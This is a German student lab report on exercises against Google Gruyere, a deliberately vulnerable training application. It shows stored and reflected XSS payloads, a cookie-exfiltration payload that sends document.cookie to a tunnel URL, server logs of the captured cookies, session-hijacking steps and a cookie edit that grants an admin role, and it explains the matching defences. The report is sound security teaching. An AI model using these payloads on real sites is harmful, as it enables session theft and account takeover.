# KN01: OWASP Top 10 – Gruyere Dokumentation

**Modul:** M183 – Applikationssicherheit implementieren  
**Auftrag:** KN01 – OWASP Top 10 mit Google Gruyere  
**Benutzer:** yanni  
**Datum:** Juni 2026

---

## Inhaltsverzeichnis

1. [A) Gruyere starten und Accounts erstellen](#a-gruyere-starten-und-accounts-erstellen)
2. [B1) Stored XSS – DOM-Manipulation](#b1-stored-xss--dom-manipulation)
3. [B2) Cookies – Sichtbarmachung im Browser](#b2-cookies--sichtbarmachung-im-browser)
4. [B3) Session-Hijacking – Cookie-Exfiltration](#b3-session-hijacking--cookie-exfiltration)
5. [C) Reflected XSS in Gruyere](#c-reflected-xss-in-gruyere)
6. [D) Client-State Manipulation](#d-client-state-manipulation)
7. [Schriftliche Antworten](#schriftliche-antworten)

---

## A) Gruyere starten und Accounts erstellen

### Schritt 1 – Gruyere-Instanz starten

Über `https://google-gruyere.appspot.com/start` wurde eine isolierte Gruyere-Instanz gestartet. Die UID lautet:

```
534777207786010371245803087048020808046
```

Diese UID erscheint in jeder URL als langer Zahlenpfad und identifiziert die persönliche Gruyere-Instanz eindeutig.

### Schritt 2 – Accounts erstellen

Es wurden zwei Accounts angelegt:

- **angreifer-yanni** – simuliert den Angreifer
- **verteidiger-yann** – simuliert das Opfer

**Screenshot – Beide Accounts erstellt (nebeneinander):**

![Gruyere beide Accounts](gruyere_1.png)

Links ist der **verteidiger-yann**-Account eingeloggt (Gruyere: Home, Snippets von Cheddar Mac und Brie sichtbar). Rechts sieht man die Bestätigungsmeldung **«Account created.»** nach dem Erstellen des **angreifer-yanni**-Accounts. Beide Accounts nutzen dieselbe Gruyere-Instanz (UID in der URL identisch). In einem zweiten Browserfenster (bzw. Inkognito-Tab) wurde der Verteidiger eingeloggt, um zwei unabhängige Sessions zu simulieren.

---

## B1) Stored XSS – DOM-Manipulation

### Hintergrund

Bei Stored XSS wird ein JavaScript-Payload dauerhaft in der Datenbank der Webapplikation gespeichert. Bei jedem Seitenaufruf – auch durch andere Benutzer – wird der Code automatisch ausgeführt. Da moderne Browser `<script>`-Tags in Formularfeldern blockieren, weichen Angreifer auf HTML-Event-Handler wie `onerror` aus.

### Payload

Als **angreifer-yanni** wurde folgender Payload in das Snippets-Eingabefeld eingegeben:

```html
<img src="x" onerror="document.querySelector('.menu').style.backgroundColor = 'red'">
```

Das `<img>`-Tag versucht, ein Bild von `src="x"` zu laden – was fehlschlägt, da `x` keine gültige URL ist. Der `onerror`-Handler wird daraufhin ausgeführt und setzt den Hintergrund des `.menu`-Elements auf Rot.

### Ergebnis

**Screenshot – Roter Menü-Hintergrund bei Angreifer (oben) und Verteidiger (unten):**

![Stored XSS roter Hintergrund beide Fenster](gruyere_2.png)

Beide Browserfenster zeigen **Gruyere: Home** mit einem roten Navigationsmenü. Oben ist **angreifer-yanni** eingeloggt, unten **verteidiger-yann**. Der Effekt tritt in beiden Fenstern auf, obwohl der Verteidiger selbst nie einen Payload eingegeben hat – der gespeicherte Snippet des Angreifers wird beim Laden der Seite für alle Benutzer ausgeführt.

**Weiterer Screenshot – DevTools mit Cookie und rotem Hintergrund:**

![onerror Payload und DevTools](onerror.png)

Dieser Screenshot zeigt das Ergebnis des `onerror`-Payloads im Fenster des Verteidigers (**verteidiger-yann** ist eingeloggt, erkennbar am Benutzernamen im Header). Im DevTools-Panel (Application → Cookies) sind die zwei GRUYERE-Cookies sichtbar. Das rote Menü bestätigt, dass der Payload des Angreifers für den Verteidiger ausgeführt wurde.

---

## B2) Cookies – Sichtbarmachung im Browser

### Payload

Als **angreifer-yanni** wurde folgender Payload im Snippets-Feld eingegeben:

```html
<img src="x" onerror="this.insertAdjacentHTML('afterend','<div style=background:#c00;color:#fff;padding:8px;margin:4px 0>Sichtbares Cookie: ' + document.cookie + '</div>')">
```

Dieser Payload liest `document.cookie` aus und zeigt den Wert in einem sichtbaren roten Kasten auf der Seite an – für jeden Benutzer mit seinem eigenen Cookie.

### Ergebnis

**Screenshot – Cookie-Anzeige im Angreifer-Fenster (links), Verteidiger-Fenster (Mitte) und DevTools (rechts):**

![Cookies sichtbar in beiden Fenstern](gruyere_3.png)

Das Bild zeigt drei Bereiche:

**Links – Angreifer-Fenster (verteidiger-yann eingeloggt, normaler View):**  
Der rote Kasten zeigt: `Sichtbares Cookie: GRUYERE=115461269|verteidiger-yann||author`

**Mitte – Angreifer-yanni Fenster (My Snippets):**  
Der rote Kasten zeigt das eigene Cookie des Angreifers sowie die vollständige `GRUYERE_ID`:  
`Sichtbares Cookie: GRUYERE=67394644|angreifer-yanni||author; GRUYERE_ID=534777207786010371245803087048020808046`

**Rechts – DevTools Application → Cookies:**  
- `GRUYERE`: Wert `67394644|angreifer-yanni||author` (Grösse 39)
- `GRUYERE_ID`: Wert mit der UID (Grösse 49)  
  Cookie Value unten: `67394644|angreifer-yanni||author`

**Screenshot – Verteidiger-Fenster mit DevTools (Cookie des Verteidigers):**

![Cookie des Verteidigers in DevTools](gruyere_als_verteidiger.png)

Im Fenster des **verteidiger-yann** sind in den DevTools (Application → Cookies) folgende Cookies sichtbar:
- `GRUYERE`: Wert beginnt mit `115461269|v...` (= `115461269|verteidiger-yann||author`)
- `GRUYERE_ID`: Wert `534777207786...` (UID)

Der Cookie-Wert des Verteidigers lautet: `115461269|verteidiger-yann||author`

---

## B3) Session-Hijacking – Cookie-Exfiltration

### Hintergrund

In B2 wurde der Cookie nur im Browser des Opfers angezeigt. In einem echten Angriff sendet der Payload den Cookie automatisch an einen externen Server. Hier übernimmt ein lokaler Python HTTP-Server die Rolle des Angreifer-Servers, via Serveo.net als HTTPS-Tunnel zugänglich gemacht.

### Schritt 1 – Angreifer-Server (Python HTTP-Server)

**Screenshot – Terminal 1: Python HTTP-Server mit eingehenden Cookie-Anfragen:**

![Python HTTP Server mit gestohlenen Cookies](terminal1.png)

```
C:\Users\yanni>python3 -m http.server 9000
Serving HTTP on :: port 9000 (http://[::]:9000/) ...
::1 - - [05/Jun/2026 14:17:24] "GET /?c=GRUYERE%3D67394644%7Cangreifer-yanni%7C%7Cauthor%3B%20GRUYERE_ID%3D534777207786010371245803087048020808046 HTTP/1.1" 200 -
::1 - - [05/Jun/2026 14:17:25] "GET /?c=GRUYERE%3D67394644%7Cangreifer-yanni%7C%7Cauthor%3B%20GRUYERE_ID%3D53477720778601037124580308704802020808046 HTTP/1.1" 200 -
::1 - - [05/Jun/2026 14:17:46] "GET /?c=GRUYERE%3D115461269%7Cverteidiger-yann%7C%7Cauthor HTTP/1.1" 200 -
::1 - - [05/Jun/2026 14:17:57] "GET /?c=GRUYERE%3D115461269%7Cverteidiger-yann%7C%7Cauthor HTTP/1.1" 200 -
::1 - - [05/Jun/2026 14:19:53] "GET /?c=GRUYERE%3D3D115461269%257Cverteidiger-yann%257C%257Cauthor%3B%20GRUYERE_ID%3D534777207786010371245803087048020808046 HTTP/1.1" 200 -
::1 - - [05/Jun/2026 14:20:17] "GET /?c=GRUYERE%3D3D115461269%7C%7Cverteidiger-yann%257C%257Cauthor%3B%20GRUYERE_ID%3D534777207786010371245803087048020808046 HTTP/1.1" 200 -
```

Der Python-Server empfängt GET-Anfragen mit dem URL-Parameter `?c=`. Dekodiert man die URL-Encoding (`%3D` → `=`, `%7C` → `|`, `%3B` → `;`):

- **Eigener Cookie (angreifer-yanni):** `GRUYERE=67394644|angreifer-yanni||author`
- **Gestohlener Cookie (verteidiger-yann):** `GRUYERE=115461269|verteidiger-yann||author`

Der Server loggt jeden eingehenden Cookie in Echtzeit – ohne dass das Opfer etwas bemerkt.

### Schritt 2 – Serveo HTTPS-Tunnel

**Screenshot – Terminal 2: Serveo Tunnel mit zugewiesener HTTPS-URL:**

![Serveo Tunnel HTTPS-URL](terminal2.png)

```
C:\Users\yanni>ssh -R 80:localhost:9000 serveo.net
...
Forwarding HTTP traffic from https://e581525f75363ff8-194-230-148-58.serveousercontent.com
```

Der Serveo-Tunnel gibt dem lokalen Python-Server (Port 9000) eine öffentliche HTTPS-URL:  
`https://e581525f75363ff8-194-230-148-58.serveousercontent.com`

Damit können Anfragen von der HTTPS-Gruyere-Seite an den Angreifer-Server ohne Mixed-Content-Blockierung gesendet werden (HTTPS → HTTPS).

### Payload

```html
<img src="x" onerror="new Image().src='https://e581525f75363ff8-194-230-148-58.serveousercontent.com/?c='+encodeURIComponent(document.cookie)">
```

Sobald der Verteidiger die Gruyere-Startseite lädt, sendet der `onerror`-Handler im Hintergrund eine GET-Anfrage mit dem Cookie an die Serveo-URL. Im Python-Terminal erscheint der gestohlene Cookie sofort.

### Sitzung übernehmen

Nach dem Kopieren des Cookie-Werts `115461269|verteidiger-yann||author` aus dem Python-Server-Log:

1. DevTools → Application → Cookies → GRUYERE-Wert ersetzen
2. Seite neu laden
3. Der Angreifer ist jetzt als **verteidiger-yann** eingeloggt

---

## C) Reflected XSS in Gruyere

### Hintergrund

Bei Reflected XSS wird der Payload nicht gespeichert, sondern direkt via URL-Parameter übergeben und vom Server sofort in die HTML-Antwort eingebettet. Nur wer den manipulierten Link öffnet, ist betroffen.

### Schritt 1 – Reflexion finden und Payload einschleusen

Der verwundbare Parameter wurde in der `snippets.gtl`-Seite gefunden. Der `uid`-Parameter wird ohne Output Encoding direkt in den HTML-Response eingebettet.

**Verwendete URL:**

```
https://google-gruyere.appspot.com/534777207786010371245803087048020808046/snippets.gtl?uid=<img src=x onerror=alert('Reflected XSS')>
```

### Schritt 2 – Payload in der URL und Network-Tab

**Screenshot – Reflected XSS URL mit Payload in der Adressleiste und DevTools Network:**

![Reflected XSS URL und Network](alert.png)

Die URL-Leiste zeigt den codierten Payload: `...7048020808046/snippets.gtl?uid=<img%20src=x%20onerror=alert(%27Reflected%20XSS%27)>`. Der Benutzer **angreifer-yanni** ist eingeloggt. Die Seite zeigt `[broken image] is not an author.` – der uid-Wert (der Payload) ist kein gültiger Benutzername, wird aber trotzdem ungefiltert gerendert. Im DevTools-Network-Panel (rechts) sind die ausgelösten Anfragen sichtbar, darunter `snippets.gtl?uid=%3Cimg%20s...` sowie der fehlgeschlagene Bildaufruf `x` (Zeile 139) – das ist der `onerror`-Auslöser.

### Schritt 3 – Payload im HTML-Quelltext (Response)

**Hinweis zum Network-Response:**

Der Payload erscheint im HTML-Quelltext der Server-Antwort ungefiltert – sichtbar im DevTools Network-Tab → Response-Tab. In der `snippets.gtl`-Antwort wird der `uid`-Parameter direkt ins HTML eingebettet ohne Output Encoding. Erkennbar auch an der Anfrage-Liste: `snippets.gtl?uid=%3Cimg%20s...` sowie der fehlgeschlagene Bildaufruf für `x` (der onerror-Auslöser). Ein separater Response-Screenshot liegt nicht vor – das Network-Tab ist im `alert.png`-Screenshot rechts sichtbar.

### Schritt 4 – Unterschied zu Stored XSS

Beim normalen Aufruf der Startseite (ohne manipulierte URL) wird kein Alert ausgelöst – der Payload existiert nicht in der Datenbank. Beim Öffnen des manipulierten Links im Fenster des Verteidigers wird der Alert jedoch auch dort ausgelöst, weil der Payload in der URL steckt.

---

## D) Client-State Manipulation

### Hintergrund

Gruyere speichert Benutzerinformationen im Cookie – inklusive der Rolle (z.B. `author` oder `admin`). Da Cookies im Browser liegen, kann ein Angreifer sie direkt verändern, sofern keine serverseitige Validierung stattfindet.

### Cookie-Analyse

Der Cookie-Wert (Base64-dekodiert oder direkt lesbar) hat folgendes Format:

```
GRUYERE=<user-id>|<username>||<role>
```

Beispiel Angreifer: `67394644|angreifer-yanni||author`  
Beispiel Verteidiger: `115461269|verteidiger-yann||author`

Um Admin-Rechte zu erlangen, muss `author` durch `admin` ersetzt werden:

```
67394644|angreifer-yanni||admin
```

**Screenshot – Gruyere nach erfolgreicher Cookie-Manipulation mit Admin-Rechten:**

![Admin-Rechte nach Cookie-Manipulation](admin.png)

Das Bild zeigt Gruyere: Home mit dem Benutzer **«normal \<normal\>»** im Header – und dem entscheidenden Link **«Manage this server»**, der nur für Admin-Benutzer sichtbar ist. In den DevTools (Application → Cookies) sind zwei GRUYERE-Cookies sichtbar:
- `GRUYERE`: Wert beginnt mit `18391299|no...` (Grösse 35) → der manipulierte Cookie mit Admin-Rolle
- `GRUYERE_ID`: Wert `534777207778...` (Grösse 49)

Der ursprüngliche Cookie-Wert `18391299|normal||author` wurde zu `18391299|normal||admin` geändert. Nach dem Neuladen zeigt Gruyere den «Manage this server»-Link – die Manipulation war erfolgreich.

---

## Schriftliche Antworten

### B1 – Stored XSS / DOM-Manipulation

**1. Warum konnte `<img onerror>` die Sicherheitsprüfung umgehen?**

Browser blockieren `<script>`-Tags in Formularfeldern häufig, weil dies ein bekannter Angriffspunkt ist und manche CSP-Implementierungen `<script>` explizit verbieten. Das `<img>`-Tag hingegen ist ein vollkommen legitimes HTML-Element – Browser müssen es rendern. Der `onerror`-Event-Handler ist ein Standard-HTML-Attribut und wird nicht pauschal blockiert. Da `src="x"` keine gültige Bild-URL ist, schlägt das Laden fehl und `onerror` wird automatisch ausgeführt – ganz ohne dass je ein `<script>`-Tag beteiligt war.

**2. Was bedeutet es, dass der Payload auch im Browser des Verteidigers ausgeführt wird?**

Das ist der entscheidende Unterschied zwischen Stored XSS und harmlosen Darstellungsfehlern: Der Code läuft **im Sicherheitskontext des Opfers** – mit dessen Session, dessen Cookies und dessen Rechten. Ein Angreifer kann damit den Cookie stehlen, Aktionen im Namen des Opfers ausführen oder weitere Payloads nachladen. Das Opfer merkt in der Regel nichts davon.

**3. OWASP Top 10 Kategorie:**

**A03:2021 – Injection** (XSS ist Teil dieser Kategorie). In der OWASP Top 10 2025 wird XSS voraussichtlich unter **A03 – Injection** verbleiben.

**4. Gegenmassnahme – Output Encoding:**

Die Applikation hätte den Snippet-Inhalt vor der Ausgabe im HTML **escapen** müssen. Dabei werden Sonderzeichen in HTML-Entitäten umgewandelt:

```
Eingabe:  <img src="x" onerror="...">
Ausgabe:  &lt;img src=&quot;x&quot; onerror=&quot;...&quot;&gt;
```

Der Browser zeigt dann den Text an, interpretiert ihn aber nicht als HTML-Code. Bibliotheken wie OWASP Java Encoder oder die Templating-Engine des Frameworks übernehmen das automatisch.

---

### B2 – Cookies

**1. Was kann ein Angreifer mit dem Session-Cookie tun?**

Ein Session-Cookie ist der einzige Beweis, den der Server braucht, um einen Benutzer zu identifizieren. Wer den Cookie kennt, kann ihn in seinen eigenen Browser eintragen (DevTools → Application → Cookies → Wert ersetzen) und ist danach für den Server identisch mit dem Opfer – ohne je dessen Passwort zu kennen. Der Angreifer kann alle Aktionen im Namen des Opfers ausführen: Daten lesen, ändern, löschen, Nachrichten senden usw.

**2. Was bewirkt das `HttpOnly`-Flag?**

Das `HttpOnly`-Flag verhindert, dass JavaScript überhaupt auf den Cookie zugreifen kann. `document.cookie` gibt einen mit `HttpOnly` gesetzten Cookie nicht zurück – er ist für JavaScript schlicht unsichtbar. Der in B2 verwendete Payload `document.cookie` hätte damit einen leeren String geliefert und der Angriff wäre gescheitert. Der Cookie wird trotzdem bei HTTP-Anfragen automatisch mitgeschickt – der Browser handhabt das transparent, aber JavaScript hat keinen Zugriff.

**3. Warum ist `localStorage` gefährlicher als `HttpOnly`-Cookies?**

`localStorage` ist für jedes JavaScript auf der gleichen Domain vollständig lesbar – ohne Einschränkung. Es gibt kein `HttpOnly`-Äquivalent. Ein einziger XSS-Payload genügt, um den gesamten `localStorage` auszulesen und an einen Angreifer-Server zu schicken. Mit einem `HttpOnly`-Cookie ist dasselbe nicht möglich, da JavaScript gar keinen Zugriff hat. Tokens oder sensible Daten im `localStorage` zu speichern ist daher grundsätzlich unsicherer.

---

### B3 – Session-Hijacking

**1. Warum konnte der Angreifer den Cookie ohne Passwort erhalten?**

Der Payload wurde in der Gruyere-Datenbank gespeichert. Beim nächsten Seitenaufruf des Verteidigers führte dessen Browser den JavaScript-Code aus – vollständig im Kontext des Verteidigers, mit dessen Cookies. Der `new Image().src=...`-Trick sendete den Cookie im Hintergrund an den Angreifer-Server. Der Angreifer brauchte keinen direkten Zugriff auf den Browser oder das Gerät des Opfers.

**2. Warum funktioniert `new Image().src` trotz Same-Origin-Policy?**

Die Same-Origin-Policy (SOP) verhindert, dass JavaScript die **Antwort** einer Cross-Origin-Anfrage lesen kann. Das **Senden** einer Anfrage (GET) ist jedoch erlaubt – der Browser schickt die Anfrage ab, darf aber die Antwort nicht auswerten. `new Image().src=...` sendet nur eine GET-Anfrage und erwartet keine lesbare Antwort. Der Angreifer-Server empfängt die Anfrage mit dem Cookie im URL-Parameter – das reicht für den Diebstahl. Die SOP schützt also nicht gegen das Senden von Daten, sondern nur gegen das Lesen von Antworten anderer Origins.

**3. Warum war der Serveo-Tunnel notwendig?**

Gruyere läuft unter HTTPS (`https://google-gruyere.appspot.com`). Browser blockieren **Mixed Content**: Eine HTTPS-Seite darf keine HTTP-Anfragen ins Internet schicken. Die EC2-Instanz wäre nur per HTTP erreichbar (`http://<EC2-IP>:9000`). Der Browser hätte die Anfrage blockiert und der Cookie wäre nie angekommen. Der Serveo-Tunnel gibt dem Python-Server eine öffentliche HTTPS-URL – damit ist die Anfrage HTTPS→HTTPS und wird nicht blockiert.

**4. Technische Massnahmen zur Verhinderung:**

- **HttpOnly-Flag:** JavaScript kann `document.cookie` nicht lesen → Payload schlägt fehl.
- **Content-Security-Policy (CSP):** `script-src 'self'` verhindert, dass Inline-JavaScript und externe Ressourcen geladen werden – `<img onerror>` würde blockiert.
- **Output Encoding:** Der Snippet-Inhalt wird escaped, bevor er ins HTML eingefügt wird → Payload wird als Text angezeigt, nicht ausgeführt.
- **Input Validation:** Snippets werden auf erlaubte Zeichen/Tags geprüft; HTML-Tags werden abgelehnt oder entfernt.

**5. Was bewirkt das `Secure`-Flag?**

Das `Secure`-Flag stellt sicher, dass der Cookie **nur über HTTPS** gesendet wird. Bei unverschlüsselten HTTP-Verbindungen sendet der Browser den Cookie gar nicht mit. Das schützt gegen Man-in-the-Middle-Angriffe, bei denen ein Angreifer den Netzwerkverkehr abfängt (z.B. in einem ungesicherten WLAN). Im Kontext dieses Angriffs hätte `Secure` allerdings nicht geholfen, da der Payload bereits im HTTPS-Kontext ausgeführt wurde.

---

### C – Reflected XSS

**1. Hauptunterschied Stored XSS vs. Reflected XSS:**

| Merkmal | Stored XSS | Reflected XSS |
|---------|-----------|---------------|
| Persistenz | Ja – Payload in DB gespeichert | Nein – nur in URL/Parameter |
| Reichweite | Alle Benutzer, die die Seite aufrufen | Nur wer den manipulierten Link öffnet |
| Verbreitung | Automatisch, kein Link nötig | Angreifer muss Link zum Opfer schicken |
| Erkennbarkeit | Schwerer – kein verdächtiger Link | Einfacher – manipulierte URL sichtbar |

**2. Social Engineering – wie bringt man das Opfer zum Klick?**

Ein Angreifer würde den manipulierten Link tarnen:
- **Phishing-E-Mail** mit einem «legitim» aussehenden Link (z.B. «Ihre Gruyere-Sitzung ist abgelaufen, bitte hier klicken»)
- **URL-Shortener** (bit.ly, tinyurl.com) verstecken die eigentliche URL
- **Typosquatting** – ähnliche Domain wie die echte Seite
- In sozialen Medien oder Foren gepostete Links mit verlockenden Beschreibungen

**3. OWASP Proactive Control gegen XSS:**

**C4 – Encode and Escape Data** (OWASP Top 10 Proactive Controls)  
Referenz: `owasp.org/www-project-proactive-controls`

Dieser Control fordert, alle Ausgaben kontextabhängig zu enkodieren: HTML-Encoding für HTML-Kontext, JavaScript-Encoding für JS-Kontext, URL-Encoding für URL-Parameter. Damit wird verhindert, dass eingeschleuste Daten als Code interpretiert werden.

---

### D – Client-State Manipulation

**1. Warum ist es gefährlich, Rollen im Client zu speichern?**

Der Client (Browser) liegt vollständig unter der Kontrolle des Benutzers. Alles, was im Cookie oder `localStorage` gespeichert ist, kann der Benutzer direkt lesen und verändern – mit DevTools in Sekunden. Sicherheitsrelevante Daten wie Rollen, Berechtigungen oder Admin-Flags im Client zu speichern bedeutet, dem Benutzer zu vertrauen, dass er diese Werte nicht manipuliert. Das ist grundsätzlich falsch: Sicherheitsentscheidungen dürfen niemals auf dem Client basieren.

**2. Berechtigungsprüfungen: Client oder Server?**

**Immer auf dem Server.** Der Server ist die einzige vertrauenswürdige Komponente im System – er liegt unter der Kontrolle des Betreibers, nicht des Benutzers. Clientseitige Checks (z.B. in JavaScript) sind nützlich für die Benutzererfahrung (schnelle Rückmeldung), aber nie für die Sicherheit. Jede Serveranfrage muss serverseitig prüfen: «Hat dieser authentifizierte Benutzer die Berechtigung, diese Aktion auszuführen?» – unabhängig davon, was der Client behauptet.

**3. OWASP Top 10 Kategorie:**

**A01:2021 – Broken Access Control** (betrifft Zugriffskontrolle und Berechtigungen)  
In der OWASP Top 10 2025 voraussichtlich weiterhin **A01 – Broken Access Control**.

---

## Zusammenfassung der OWASP-Kategorien

| Aufgabe | Schwachstelle | OWASP Top 10 (2021) |
|---------|--------------|---------------------|
| B1, B2, B3 | Stored XSS | A03 – Injection |
| C | Reflected XSS | A03 – Injection |
| D | Client-State Manipulation | A01 – Broken Access Control |

---

## Screenshot-Übersicht

| Dateiname | Inhalt |
|-----------|--------|
| `gruyere_1.png` | Beide Accounts erstellt (verteidiger-yann links, angreifer-yanni rechts mit «Account created.») |
| `gruyere_2.png` | Stored XSS B1 – roter Menühintergrund bei Angreifer (oben) und Verteidiger (unten) |
| `gruyere_3.png` | B2 – Cookie-Anzeige im roten Kasten, beide Fenster + DevTools mit Cookie-Werten |
| `gruyere_als_verteidiger.png` | DevTools Application → Cookies des Verteidigers (GRUYERE=115461269\|verteidiger-yann\|\|author) |
| `onerror.png` | B1 – Verteidiger-Fenster mit rotem Menü + DevTools Cookies (Beweis für cross-user Ausführung) |
| `alert.png` | C – Reflected XSS: Payload in URL-Leiste + DevTools Network (fehlgeschlagener Bildaufruf `x` als onerror-Auslöser) |
| `admin.png` | D – Client-State Manipulation: «Manage this server»-Link nach Cookie-Manipulation + DevTools Cookies sichtbar |
| `terminal1.png` | B3 – Python HTTP-Server mit eingehenden Cookie-Anfragen (gestohlene Cookies sichtbar) |
| `terminal2.png` | B3 – Serveo SSH-Tunnel mit zugewiesener HTTPS-URL (`https://e581525f...serveousercontent.com`) |

---
